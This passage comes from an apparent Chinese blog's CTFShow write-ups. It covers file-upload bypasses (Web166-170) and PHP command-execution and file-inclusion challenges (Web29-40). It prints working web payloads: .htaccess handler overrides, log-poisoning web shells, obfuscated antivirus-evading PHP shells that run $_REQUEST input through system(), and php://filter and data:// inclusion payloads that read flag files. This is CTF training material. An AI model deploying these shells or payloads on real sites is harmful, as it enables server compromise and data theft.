</p><p>已经渲染过直接使用，不用跑脚本了</p><p><img src="/posts/fdac7c8/payload.jpg" alt="payload"></p><h2 id="Web166"><a href="#Web166" class="headerlink" title="Web166"></a>Web166</h2><p>只能上传zip文件</p><p><img src="/posts/fdac7c8/image-20220421213533539.png" alt="image-20220421213533539"></p><p>先上传然后更改内容 蚁剑连接 url为下载链接</p><h2 id="Web167"><a href="#Web167" class="headerlink" title="Web167"></a>Web167</h2><p>.htaccess绕过</p><p>先上传.htaccess文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;  </span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后上传1.jpg内容为一句话</p><p>蚁剑链接</p><p>其他方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg   //将.jpg后缀的文件解析 成php</span><br></pre></td></tr></table></figure><p>如果flag不是php文件，那么还可以像.user.ini一样在当前目录加载一个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &#x27;flag&#x27;</span><br></pre></td></tr></table></figure><h2 id="Web168"><a href="#Web168" class="headerlink" title="Web168"></a>Web168</h2><p>基础免杀可利用短标签进行命令执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ../flagaa.php`?&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/fdac7c8/image-20220421231200875.png" alt="image-20220421231200875"></p><p>访问xxx&#x2F;upload&#x2F;1.php</p><p>其他免杀姿势</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">strrev</span>(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web169"><a href="#Web169" class="headerlink" title="Web169"></a>Web169</h2><p>先在upload中上传一个index.php</p><p>内容为123</p><p><img src="/posts/fdac7c8/image-20220421232210882.png" alt="image-20220421232210882.png"></p><p>再上传一个.user.ini 包含日志文件</p><p><img src="/posts/fdac7c8/image-20220421233303438.png" alt="image-20220421233303438"></p><p>再ua中写入一句话</p><p>蚁剑连接 xxx&#x2F;upload</p><h2 id="Web170"><a href="#Web170" class="headerlink" title="Web170"></a>Web170</h2><p>同169</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.前端校验修改前端代码，或burp抓包<br>2.后端校验前端上传php,burp修改MIME<br>3.user.ini<br>4.文件魔术字节欺骗php过滤，采用简写<br>5.php骚操作<br>6.日志包含绕过<br>7.GlF89A绕过getimagesize<br>8.png图片二次渲染<br>9.jpg图片二次渲染<br>10.zip文件上传<br>11.apache解析漏洞<br>12.木马免杀</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_命令执行</title>
      <link href="/posts/999021e8/"/>
      <url>/posts/999021e8/</url>
      
        <content type="html"><![CDATA[<p>命令执行绕过姿势：<a href="https://blog.csdn.net/qq_45836474/article/details/107248010">https://blog.csdn.net/qq_45836474/article/details/107248010</a></p><h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用正则过滤了flag</p><p>绕过方法:<a href="https://www.cnblogs.com/zzjdbk/p/13491028.html">https://www.cnblogs.com/zzjdbk/p/13491028.html</a></p><p>可以使用重造变量的方法来读取flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system($_GET[&#x27;a&#x27;]);&amp;a=cat flag.php;</span><br></pre></td></tr></table></figure><p>或者</p><p>使用双引号过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `cat fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次过滤了flag，system，php</p><p>使用引号过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `cat fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次过滤了<code> flag system php cat sort shell . 单引号和空格</code></p><p>这里用重造变量的方法</p><p>system不能用了换成eval</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">eval</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">参数a的system可以换成passthru()</span></span><br><span class="line">?c=eval($_GET[&quot;a&quot;]);&amp;a=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用tac绕过对cat的过滤</span></span><br><span class="line"><span class="comment"># 用%09绕过对空格的过滤</span></span><br><span class="line">?c=<span class="keyword">echo</span>`tac%<span class="number">09</span>fl*`;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用passthru绕过system的过滤</span></span><br><span class="line"><span class="comment"># tac饶过cat的过滤</span></span><br><span class="line">?c=<span class="title function_ invoke__">passthru</span>(<span class="string">&quot;tac%09f*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面这个没研究明白</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次比上一次多过滤了 反引号，分号，echo以及括号</p><p>对于;的过滤可以使用?&gt;来绕过 因为php的最后一条语句不需要分号</p><p>但是由于括号的过滤，只能使用一些不需要()的函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用伪协议配合文件包含漏洞</span></span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>php伪协议详解：<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><p>得到一段base64 解密得到flag</p><h2 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这此过滤又加了一个双引号</p><p>还是可以使用伪协议绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>base64解码得到flag</p><h2 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次又加上了冒号但是他只对c的传参进行了过滤</p><p>还可以使用伪协议</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>base64解码拿到flag</p><h2 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次又多了\</p><p>但是还是只对c进行了过滤</p><p>使用伪协议过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>base64解码拿到flag</p><h2 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次多了&lt; &#x3D; 以及0-9的过滤</p><p>把伪协议payload中的1改为a</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>base64解码拿到flag</p><h2 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;      </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>include文件包含并且过滤了flag</p><p>这里用<code>data://</code>协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(<span class="string">&quot;cat fla*&quot;</span>)?&gt;</span><br><span class="line">或使用<span class="built_in">base64</span>封装数据</span><br><span class="line">?c=data://text/plain;<span class="built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>右键源代码获取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">    &#125;        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>继续使用data:&#x2F;&#x2F;协议</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>右键原代码获取flag</p><h2 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次文件包含 题目中直接加了后缀所以这次不需要后缀</p><p>但是这还可以使用data:&#x2F;&#x2F;伪协议</p><p>data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(&quot;cat fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure><h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这次过滤了一堆符号但是仔细观察这里过滤的是中文符号……</p><p>所以这里可以使用英文符号</p><p>这里要使用无参数RCE</p><p>参考链接：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E5%89%8D%E8%A8%8">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E5%89%8D%E8%A8%8</a></p><h3 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h3><p><code>localeconv()</code> 